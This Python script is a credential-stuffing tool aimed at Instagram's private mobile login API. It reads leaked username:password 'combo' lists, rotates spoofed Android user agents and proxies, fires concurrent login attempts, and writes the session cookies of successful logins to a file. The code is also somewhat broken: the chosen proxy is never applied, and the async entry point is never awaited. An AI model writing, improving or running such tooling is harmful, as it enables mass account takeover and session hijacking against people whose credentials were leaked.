import json
import random
import uuid
import httpx
import asyncio


class InstagramLogin:
    def __init__(self, proxies_file: str, combo_file: str, cookies_file: str) -> None:
        self.proxies = self.load_proxies(proxies_file)
        self.combos = self.load_combos(combo_file)
        self.cookies_file = cookies_file

    @staticmethod
    def load_proxies(proxies_file: str) -> list:
        with open(proxies_file, "r") as f:
            return f.read().splitlines()

    @staticmethod
    def load_combos(combo_file: str) -> list:
        with open(combo_file, "r") as f:
            return [line.strip().split(":") for line in f]

    @staticmethod
    def base_headers() -> dict:
        return {
            "Host": "i.instagram.com",
            "User-Agent": InstagramLogin.base_useragent(),
            "cookie": "missing",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }

    @staticmethod
    def base_useragent() -> str:
        user_agents = [
            "Instagram 114.0.0.20.2 Android (30/3.0; 133dpi; 623x1280; huawei/google; Nokia 2.4; angler; angler; en_US)",
            "Instagram 114.0.0.38.120 Android (30/3.0; 320dpi; 700x1245; samsung; Galaxy; angler; angler; en_US)",
            "Instagram 114.0.0.20.70 Android (30/3.0; 515dpi; 800x1280; Xiaomi; Mobile Phones; angler; angler; en_US)",
            "Instagram 114.0.0.28.120 Android (30/3.0; 160dpi; 1080x2340; OnePlus; Unlocked Smartphones; angler; angler; en_US)",
            "Instagram 114.0.0.0.24 Android (30/3.0; 640dpi; 1320x2400; HUAWEI; Mobile Phones; angler; angler; en_US)",
            "Instagram 114.0.0.0.41 Android (30/3.0; 240dpi; 1242x2688; Nexus 6P; Mobile Phones; angler; angler; en_US)",
        ]
        return random.choice(user_agents)

    async def login_req(self, client: httpx.AsyncClient, username: str, password: str) -> None:
        try:
            login_payload = {
                "uuid": str(uuid.uuid4()),
                "password": password,
                "username": username,
                "device_id": uuid.uuid4(),
                "from_reg": "false",
                "_csrftoken": "missing",
                "login_attempt_countn": "0",
            }

            resp = await client.post(
                url="https://i.instagram.com/api/v1/accounts/login/",
                headers=self.base_headers(),
                data=login_payload,
                follow_redirects=True,
            )

            if "logged_in_user" in resp.text:
                with open(self.cookies_file, "a") as f:
                    f.write(str(resp.cookies) + "\n")

        except:
            await self.login_req(client, username, password)

    async def start(self) -> None:
        async with httpx.AsyncClient(timeout=5) as client:
            tasks = []
            for combo in self.combos:
                proxy = random.choice(self.proxies)
                http_proxy = {"http://": f"http://{proxy}", "https://": f"http://{proxy}"}

                tasks.append(
                    asyncio.ensure_future(
                        self.login_req(
                            client=client,
                            password=combo[1],
                            username=combo[0],
                        )
                    )
                )

            await asyncio.gather(*tasks)


if __name__ == "__main__":
    InstagramLogin(
        proxies_file="proxy.txt",
        combo_file="combo.txt",
        cookies_file="cookies.txt",
    ).start()